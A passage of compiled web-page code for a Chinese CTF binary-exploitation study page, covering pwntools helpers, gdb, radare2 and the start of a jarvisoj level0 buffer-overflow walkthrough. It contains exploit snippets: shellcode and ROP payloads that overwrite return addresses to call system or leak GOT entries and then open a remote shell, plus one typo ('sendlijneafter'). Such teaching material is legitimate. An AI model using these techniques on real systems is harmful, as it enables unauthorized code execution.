punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'./pwn'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("raw_input")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n这时看pid，比如是 "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("6533")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" 新建终端，\n$gdb\n$attach "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("6533")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br")])]),n("h3",{attrs:{id:"指令介绍"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#指令介绍"}},[t._v("#")]),t._v(" 指令介绍")]),t._v(" "),n("p",[t._v("p32、p64是64/32位代码 打包为二进制，u32、u64是解包为二进制")]),t._v(" "),n("p",[n("strong",[t._v("flat模块能将pattern字符串和地址结合并且转为字节模式")])]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("payload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cyclic"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("32")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x804a060")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendlijneafter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("':'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x8c")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" e"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x804a024")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("p",[t._v("symbols")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("ELF('./level3').symbols['main']\nELF('./level3').sym['main']\n")])])]),n("p",[t._v("gdb.attach(sh) # gdb附加到调试")]),t._v(" "),n("h3",{attrs:{id:"示例"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#示例"}},[t._v("#")]),t._v(" 示例")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\ncontext"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("log_level "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'debug'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" arch "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'i386'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" os "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'linux'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 能显示调试信息")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#io = process('./level1') ")]),t._v("\nio "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" remote"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'pwn2.jarvisoj.com'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9877")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 远程连接")]),t._v("\ntext "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" io"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("14")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 获取返回值")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# recvline(keepends=True) : 接收一行，keepends为是否保留行尾的\\n")]),t._v("\nshellcode "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" asm"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("shellcraft"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# pwntools生成的 sh 的shellcode")]),t._v("\np64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x400000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 地址转 64 位二进制")]),t._v("\np32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x400000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 地址转 32 位二进制")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" shellcode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'latin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x90'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x88")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x4")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("-")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("len")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("shellcode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("buf_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'latin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("send"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("close"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br")])]),n("p",[t._v("从write返回main")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'A'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x88")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("write_plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("main_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("write_got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# payload = flat('a'*0x88, p64(syscall), p64(syscall)) # buuctf这题需要2个，不明白。好像是栈没对齐的原因")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("h4",{attrs:{id:"输入字符"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#输入字符"}},[t._v("#")]),t._v(" 输入字符")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[t._v("io"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendlineafter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'name'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"your name"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("io"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvall"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("h4",{attrs:{id:"汇编转二进制、数字、字符转换等"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#汇编转二进制、数字、字符转换等"}},[t._v("#")]),t._v(" 汇编转二进制、数字、字符转换等")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# python3")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("asm"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'XCHG EAX,ESP\\nRET\\nMOV ECX,[EAX]\\nMOV [EDX],ECX\\nPOP EBX\\nRET'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("lower"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br")])]),n("p",[t._v("p32")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x8040000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("b'\\x00\\x00\\x04\\x08'")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("p",[t._v("u32使用")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" u32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x00\\x00\\x04\\x08'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("134479872")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">>")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[t._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("u32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\\x00\\x00\\x04\\x08'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'0x8040000'")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("h4",{attrs:{id:"runshellcode"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#runshellcode"}},[t._v("#")]),t._v(" runshellcode")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\nrun_shellcode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("encode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("h3",{attrs:{id:"相关知识"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#相关知识"}},[t._v("#")]),t._v(" 相关知识")]),t._v(" "),n("p",[t._v("通过ldd查找libc共享库， 这里python需要用到c语言的标准动态库, srand用到libc.so.6")]),t._v(" "),n("div",{staticClass:"language-sh line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sh"}},[n("code",[t._v("kali@kali:/mnt/hgfs/vmware$ ldd guess_num \n        linux-vdso.so.1 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x00007ffec67fa000"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        libc.so.6 "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" /lib/x86_64-linux-gnu/libc.so.6 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x00007faeab4e3000"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n        /lib64/ld-linux-x86-64.so.2 "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("0x00007faeab8c1000"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("h2",{attrs:{id:"one-gadget"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#one-gadget"}},[t._v("#")]),t._v(" one_gadget")]),t._v(" "),n("p",[t._v("one_gadget libc_32.so.6\nhttps://xz.aliyun.com/t/6598")]),t._v(" "),n("p",[t._v("one_gadget 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见"),n("a",{attrs:{href:"https://xz.aliyun.com/t/2720",target:"_blank",rel:"noopener noreferrer"}},[t._v("此处"),n("OutboundLink")],1)]),t._v(" "),n("h2",{attrs:{id:"radare2使用"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#radare2使用"}},[t._v("#")]),t._v(" radare2使用")]),t._v(" "),n("p",[t._v("r2 ./bof")]),t._v(" "),n("p",[t._v("aa分析")]),t._v(" "),n("p",[t._v("afl看函数 analysis function list")]),t._v(" "),n("p",[t._v("跳到main\ns main\ns 0x1234地址\nV 看内存\nVV 进入virtual mode，能看图")]),t._v(" "),n("p",[t._v("s sym.hidden\nVV\n看绿色 call sym.imp.system 参数是 bin/sh\ns sym.main(转到main)")]),t._v(" "),n("p",[t._v("执行\n./bof1")]),t._v(" "),n("p",[t._v("光标处按:提示:> 修改，\n:> afvn改名字\nlocal_10h 改为 input\n:> afvn input local_10h")]),t._v(" "),n("p",[t._v("aa 分析\naaa 分析 一般用这个够了\naaaa 分析")]),t._v(" "),n("h2",{attrs:{id:"练习"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#练习"}},[t._v("#")]),t._v(" 练习")]),t._v(" "),n("h4",{attrs:{id:"_1-内存泄漏"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#_1-内存泄漏"}},[t._v("#")]),t._v(" 1. 内存泄漏")]),t._v(" "),n("p",[t._v("1.内存泄漏 xman_level0 "),n("a",{attrs:{href:"https://dn.jarvisoj.com/challengefiles/level0.b9ded3801d6dd36a97468e128b81a65d",target:"_blank",rel:"noopener noreferrer"}},[t._v("file"),n("OutboundLink")],1)]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("nc pwn2.jarvisoj.com 9881\n# 覆盖 填充长度 + 一个bp 大小(8bytes)\n")])])]),n("p",[t._v("思路：")]),t._v(" "),n("p",[t._v("扔进IDA看strings, 有bin/sh, 进入按X，看函数调用地址。")]),t._v(" "),n("p",[t._v("左侧函数窗口，看main函数")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v('int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  write(1, "Hello, World\\n", 0xDuLL);\n  return vulnerable_function();\n}\n')])])]),n("p",[t._v("看 vulnerable_function")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("ssize_t vulnerable_function()\n{\n  char buf; // [rsp+0h] [rbp-80h] # 读buf 占 0x80，双击进入，\n  return read(0, &buf, 0x200uLL); # 就读入 0x200， 即16*16*2 =512个bytes\n}\n\n# buf \n-0000000000000002                 db ? ; undefined\n-0000000000000001                 db ? ; undefined\n+0000000000000000  s              db 8 dup(?) \n+0000000000000008  r              db 8 dup(?) # 存放返回地址， 多空余0x8字节，加上前面的0x80字节，就是0x88个字节\n")])])]),n("p",[t._v("read可以读入0x200，即512个字符，而从buf到vulnerable_function的返回地址只有0x80+0x8,即 136个字节 < 512，因此可以覆盖 vulnerable_function 的返回地址为 call_system 函数地址，即可getshell")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# -*- coding:utf-8 -*-")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n\nsh "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" remote"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"pwn2.jarvisoj.com"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9881")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" \njunk "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token 